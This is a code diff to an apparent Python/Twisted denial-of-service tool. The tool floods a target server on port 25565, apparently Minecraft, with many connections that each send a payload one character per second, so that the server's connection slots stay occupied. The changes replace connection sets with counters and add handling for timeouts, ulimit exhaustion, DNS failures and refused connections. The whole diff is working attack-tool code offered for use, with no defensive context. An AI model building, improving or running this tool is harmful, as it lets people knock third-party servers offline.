@@ -43,6 +43,8 @@ from twisted.internet import pollreactor
 pollreactor.install()
 
 from twisted.internet import reactor
+from twisted.internet.error import (ConnectBindError, ConnectionRefusedError,
+    DNSLookupError, TimeoutError)
 from twisted.internet.protocol import Factory, Protocol
 from twisted.internet.endpoints import TCP4ClientEndpoint
 from twisted.internet.task import LoopingCall
@@ -71,11 +73,11 @@ class TrickleProtocol(Protocol):
         Send our payload at an excrutiatingly slow pace.
         """
 
-        # Send the packet type immediately, and then enter into the library
-        # function with the next part of the payload.
-        self.sendchar()
+        self.factory.pending -= 1
+        self.factory.connections += 1
+
         self.loop = LoopingCall(self.sendchar)
-        self.loop.start(1)
+        self.loop.start(1, now=False)
 
     def sendchar(self):
         """
@@ -93,7 +95,7 @@ class TrickleProtocol(Protocol):
         Remove ourselves from the factory.
         """
 
-        self.factory.connections.discard(self)
+        self.factory.connections -= 1
 
 class TrickleFactory(Factory):
     """
@@ -102,9 +104,10 @@ class TrickleFactory(Factory):
 
     protocol = TrickleProtocol
 
+    connections = 0
+    pending = 0
+
     def __init__(self):
-        self.connections = set()
-        self.pending = set()
         self.endpoint = TCP4ClientEndpoint(reactor, arguments[0], 25565,
             timeout=2)
 
@@ -113,22 +116,49 @@ class TrickleFactory(Factory):
 
     def spawn_connection(self):
         for i in range(options.count):
-            if len(self.connections) + len(self.pending) >= options.max:
+            if self.connections + self.pending >= options.max:
                 return
 
             d = self.endpoint.connect(self)
-            self.pending.add(d)
+            self.pending += 1
 
-            def cb(protocol):
-                self.pending.discard(d)
-                self.connections.add(protocol)
-            def eb(reason):
-                pass
-            d.addCallbacks(cb, eb)
+            def eb(failure):
+                self.pending -= 1
+                if failure.check(TimeoutError):
+                    pass
+                elif failure.check(ConnectBindError):
+                    warn_ulimit()
+                elif failure.check(ConnectionRefusedError):
+                    exit_refused()
+                elif failure.check(DNSLookupError):
+                    warn_dns()
+                else:
+                    log.msg(failure)
+            d.addErrback(eb)
 
     def log_status(self):
         log.msg("%d active connections, %d pending connections" %
-            (len(self.connections), len(self.pending)))
+            (self.connections, self.pending))
+
+def warn_ulimit(called=[False]):
+    if not called[0]:
+        log.msg("Couldn't bind to get an open connection.")
+        log.msg("Consider raising your ulimit for open files.")
+    called[0] = True
+
+def warn_dns(called=[False]):
+    if not called[0]:
+        log.msg("Couldn't do a DNS lookup.")
+        log.msg("Either your ulimit for open files is too low...")
+        log.msg("...or your target isn't resolvable.")
+    called[0] = True
+
+def exit_refused(called=[False]):
+    if not called[0]:
+        log.msg("Your target is not picking up the phone.")
+        log.msg("Connection refused; quitting.")
+        reactor.stop()
+    called[0] = True
 
 log.msg("Trickling against %s" % arguments[0])
 log.msg("Running with up to %d connections" % options.max)
